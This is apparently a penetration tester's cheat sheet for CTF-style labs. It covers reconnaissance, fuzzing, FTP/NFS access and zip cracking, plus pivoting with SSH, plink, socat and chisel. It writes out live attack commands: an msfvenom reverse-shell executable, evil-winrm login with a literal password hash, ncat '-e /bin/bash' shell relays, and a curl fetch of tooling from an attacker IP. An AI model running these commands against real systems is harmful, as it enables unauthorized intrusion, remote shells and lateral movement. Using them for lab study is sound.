
What should be our Methodology when we are seeing a Website  ??
- Service Version Information
- Backend Directory's
- Looking for Source Code
- Potential Vulnerability Scanning With Nikto

Follow the concept called KISS (keep it simple STUPID)

<h2>Nmap</h2>
Download a [static nmap binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap).

https://github.com/andrew-d/static-binaries

Normal Nmap Scanning
```
nmap -T4 -p- -A -Pn <IP_Address>
```

```
nmap -sS -T4 -p- -Pn <IP_Address>
```

```
nmap -sU -T4 --top-ports 1000 <IP_Address>
```



## Ping Sweep
```
nmap -sn -n 10.200.95.0/24 -oA Ping-Sweep
```

```
nmap -sS 10.200.145.33 10.200.145.250 -v -oA Initial-Scan-Subnet1-Hosts
```

Netcat aka NC
```
nc -zv <IP_Address> 1-65535
```


## Route
```
route -n
```

We have another option of scanning in windows even if we don't have nmap and have a powershell. (.e. Situational Awererness)
```
evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
```

```
Invoke-Portscan.ps1
```

```
Get-Help Invoke-Portscan
```

```
 Invoke-Portscan -Hosts <IP_Address> -TopPorts 50
```



<h2>Nikto</h2>
```
 nikto -h <IP_Address>
```




<h2>Fuzzing</h2>
>[!important]  Gobuster

Vhost
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<IP_Address> -o gobuster/vhost-sub.txt -t 2
```

```
gobuster vhost -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://<IP_Address> -t 2 -o gobuster/vhost-sub.txt
```

Directory Busting
```
gobuster dir -u http://<hostname> -w /usr/share/wordlists/dirb/common.txt
```

```
-b to whiltelist
```

```
gobuster dir -u http://10.10.10.179/ -w /usr/share/wordlists/dirb/common.txt -b 404,403
```


>[!important] Wfuzz
```
wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
```

```
wfuzz -u http://<Hostname> -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt  -H "Host: FUZZ.<hostname>" --hc 400
```

```
--hc Hide status code
--hw Hide word count
--hl Hide line count
--hh Hide character count
```


>[!important] ffuf
```
ffuf -u http://holo.live -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST:FUZZ.holo.live" -mc 200 -o fuzz_holo.txt
```

```
Response code :
200 means ok
400 means error (i.e. 404 page not found)
300 means redirect
500 means server error
```

>[!important] 




<h2>Sub-Domains</h2>
Sublist3r
```
sublist3r -d <domain_name> -t 100
```

Amass
```
amass enum -d tesla.com 
```

```
amass intel -d tesla.com -whois
```

Httpprobe
```
cat domains.txt | httprobe >> working_domains.txt
```




<h2>Enumeration</h2>
```
wpscan -url <IP_address>    
```


```
whatweb <domain_name>
```




<h2>Google Dorks</h2>
```
site:tesla.com 
```

```
site:tesla.com -www
```

```
site:tesla.com -www -ir 
```

```
site:tesla.com filetype:docx
```

```
site:tesla.com filetype:pdf
```




<h2>Nessus</h2>
```
sudo dpkg -i Nessus-10.2.0-fbsd11-amd64.deb
```

New Scan ---> Vulnerability ---> Basic Network Scan

```
/bin/systemctl start nessusd.service
```

```
https://kali:8834/ 
```

 NEVER TRUST a vulnerability scanner always find it and verify it........


<h2>IP</h2>
```
After we run this command than only we were able to see the IP address.
Command : dhclient
Command : ip a 
```


<h2>ARP-Scan</h2>
```
arp-scan -l
```


<h2>FTP</h2>
```
FTP <ip address>
```

if want to download all the files:
```
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
```

```
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
```



<h2>NFS</h2>
```
Command : showmount -e <Ip address>
where e is used to list out the directories (i.e. mounted file share)
```

```
Command : mkdir /mnt/dev
Command : mount -t nfs 192.168.205.132/srv/nfs /mnt/dev
```

```
Now will make a directory to mount this file share (i.e. /srv/nfs )
will cd to /mnt (i.e. will have a by default directory named mnt )
where t is tack and nfs is the type 
```


<h2>Crack ZIP</h2>
```
 fcrackzip -v 
```

```
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```


<h2>MS Venom</h2>
```
Command : msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=7777 -f exe > Wise.exe
```
where p is payload and f is filetype -o/> for output file



<h2>Dnsrecon </h2>
```
Command : dnsrecon -r 127.0.0.0/24 -n 192.168.205.134 -d blah
```

```
dnsrecon -r 10.10.10.179 -d megacorp.local
```

```
As there is dns record named blackpearl.tcm and have to add that in our Dns and etc/hosts file
Command : nano /etc/hosts (i.e. we have to add the edit the hosts file and not host)
And add 
192.168.205.134 blackpearl.tcm and save it 
```


<h2>SSH </h2>
```
 ssh -p 22 username@<ip_Address>
```


<h2>RDP </h2>
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.132.76 /u:User_name /p:'password'
```

<h2>Firewall</h2>
the port which should be greater than 15000.
```
firewall-cmd --zone=public --add-port 44444/tcp
```

```
firewall-cmd --list-all
```


# Pivoting 
https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-socat/#port-forwarding-(from-remote-machine)


[All in one Static Binaries](https://github.com/andrew-d/static-binaries)
## Pivoting using SSH and Proxychains

### Port Forwarding
```
ssh -L 8000:<webserver_address>:80 user@<ipaddress> -fN
```

Port Forwarding `-L`
Proxies `-D`


### Reverse Port Forward

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

```
ssh -R 2222:17.16.0.100:22 kali@17.16.0.200 -i id_rsa -fN
```
 
Reverse Forwarding`-R`


### Windows (Plink.exe) | Puttygen

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

```
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

`cmd.exe /c echo y` at the start is for non-interactive shells



### Socat | Fully Stable Linux Shell

- Superb for Port Forwarding
- rarely installed by default on a target
- Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required


Port Forwarding
```
socat tcp-listen:8080,fork tcp:<remote-ip>:80
```


Reverse Shell Relay
```
 ./socat-sardarji  tcp-l:8000 tcp:10.50.106.240:4444 &
socat linux binary  machine port       attacker IP and port
```

```
./ncat_sardarji 127.0.0.1 8000 -e /bin/bash
```

Attacker machine
```
nc -lvnp 4444
```



# Chisel [Chisel](https://github.com/jpillora/chisel)

Download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal.

## Reverse SOCKS Proxy:

Attack Machine:
```
./chisel server -p LISTEN_PORT --reverse &
```

```
curl 10.50.106.240/chisel_1.9.1_linux_amd64  -o chisel-sardarji
```

```
Attacker
./chisel_1.9.1_linux_amd64 server -p 1337 --reverse & 
```


Compromised

```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

```
client 10.50.88.33:1337 R:socks &
```


Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on `127.0.0.1:1080`. As such, we will be using port 1080 when sending data through the proxy.


## Sshuttle

>[!Warning]
>Sshuttle only works on Linux targets.

If we have password
```
sshuttle -r username@address -N
```


for key based authentication
```
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
```

```
sshuttle -r root@thomaswreath.thm --ssh-cmd "ssh -i id_rsa" 10.200.105.0/24 
```


